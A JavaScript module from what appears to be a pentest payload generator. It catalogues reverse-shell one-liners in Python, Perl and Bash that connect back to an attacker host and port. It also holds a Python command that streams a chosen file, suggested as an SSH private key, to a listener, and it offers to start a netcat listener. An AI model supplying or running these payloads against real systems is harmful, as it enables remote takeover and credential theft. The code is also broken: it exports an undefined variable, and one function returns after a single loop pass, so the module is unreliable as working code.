var prompt = require('prompt');
var log = require('cli-color');
var options = log.yellow
var yellow = log.yellow
var blue = log.cyan
var black = log.blackBright
var green = log.green
var red = log.red

var ncat = require("../modules/ncat.js")

// Todo (needs factoring)
var ncatInit = function(returnToPrepare, msg, type){

	if (msg){
		prompt.message = msg
		prompt.get([{name: '_', description: ':'}], function(err, result){
			var a1 = result._
			prompt.message = "Should I start a netcat listener for you? (Y/n)"

			prompt.get([{name: '_', description: ':'}], function(err, result){
				result._ = result._.toUpperCase()
				if (result._ === "Y"){
					if (type === "shell"){
						var server = ncat.shell(returnToPrepare,a1)
					}
					else {
						var server = ncat.file(returnToPrepare,a1)
					}
					
				}
				else {
					returnToPrepare(a1)
				}
				
			})
			//returnToPrepare(result._)
		})	
	}
	else {
		prompt.message = "Should I start a netcat listener for you? (Y/n)"

		prompt.get([{name: '_', description: ':'}], function(err, result){
			result._ = result._.toUpperCase()
			if (result._ === "Y"){
				var server = ncat.shell(returnToPrepare)
			}
			else {
				returnToPrepare()
			}
			
		})
	}


}


// Payload Array
arrayMisc = []

var Load = function(obj){
	arrayMisc.push(obj)
}

/* 
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis
	
	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>	 


*/

// ############### Reverse Shells ######################

Load({
	title: "Reverse Shell Python", 
	payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"<PROMPT (shell type)>\",\"-i\"]);'",
	category: "Reverse Shells",
	callback: function(returnToPrepare){
		ncatInit(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc) :", "shell")
	}
})

Load({
	title: "Reverse Shell Perl",
	payload: "perl -e 'use Socket;$i=\"<LHOST>\";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"<PROMPT (shell type)> -i\");};'",
	category: "Reverse Shells",
	callback: function(returnToPrepare){
		ncatInit(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc) :", "shell")
	}
})

Load({
	title: "Reverse Shell Bash",
	payload: "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
	category: "Reverse Shells",
	callback: function(returnToPrepare){
		ncatInit(returnToPrepare, null, "shell")
	}
})


// ############### Exfiltration ######################

Load({
	title: "Send File via Socket Connection",
	payload:'python -c \'exec """\nimport socket;import sys;s = socket.socket();s.connect(("$$LHOST$$",$$LPORT$$));f=open ("$$PROMPT$$", "rb");l = f.read(1024)\nwhile (l):\n    s.send(l)\n    l = f.read(1024)\ns.close();"""\'',
	sample: 'python -c \'exec """\nimport socket;import sys;s = socket.socket();s.connect(("$$LHOST$$",$$LPORT$$));f=open ("$$PROMPT$$", "rb");l = f.read(1024)\nwhile (l):\n    s.send(l)\n    l = f.read(1024)\ns.close();"""\'',
	category: "Exfiltration",
	callback: function(returnToPrepare){
		ncatInit(returnToPrepare, "Which file would you like to exfiltrate? (ex: /.ssh/id_rsa) :", "file")
	}
})
// 

var unique = []
var uniqueCategories = []

module.exports = {
	values: arrayInfo,
	getAll: function(value){
		tempArray = []
		for(i=0;i<arrayMisc.length;i++){
			if (arrayMisc[i].category === value){
				tempArray.push(arrayMisc[i])
			}
		}
		return tempArray
	},
	getCategories: function(){
		for (i=0;i<arrayMisc.length;i++){
			if(unique[arrayMisc[i].category]){

			}
			else {
				unique[arrayMisc[i].category] = true;
				uniqueCategories.push(arrayMisc[i].category)
			} 
		return uniqueCategories
		}
	}
}